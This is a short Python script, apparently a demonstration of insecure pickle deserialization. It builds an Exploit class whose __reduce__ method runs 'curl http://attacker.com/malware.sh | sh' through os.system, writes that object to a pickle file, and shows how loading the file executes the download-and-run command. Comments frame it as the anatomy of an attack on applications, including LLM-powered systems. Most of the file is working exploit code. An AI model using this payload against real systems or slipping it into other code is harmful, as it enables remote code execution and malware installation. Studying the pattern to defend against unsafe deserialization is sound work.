import pickle
import os

        # The ANATOMY of an attack!

class Exploit:
    def __reduce__(self): # While this offers flexibility for good use cases! - BUT it's a design architecture decision that threat actors exploit (a Python runtime exploit) 
        return (os.system, ("curl http://attacker.com/malware.sh | sh", )) 
    
        # remains stealthy and recursive - hides in a list of lists/
        # ..dicts of classes
    
with open("malicious_task.pickle", "wb") as f: pickle.dump(Exploit(), f)  
print(("Malicious pickle file 'malicious_task.pickle' created"))


        # Function to Process a Task

def process_task_from_file(filename): 
    with open(filename, "rb") as f: 
        serialized_task = f.read()

        #bingo

    task = pickle.loads(serialized_task) # this line triggers '__reduce__' from the Exploit object
    print(f"Executing task: {task}")    # as a result 'os.system' executes

    process_task_from_file("malicious_task.pickle")


        # If an application fails to sanitize, an attacker's payload has the ability to run arbitrary system commands, 
        # potentially leading to RCE, data theft, or lateral movement within an LLM-powered system.
    

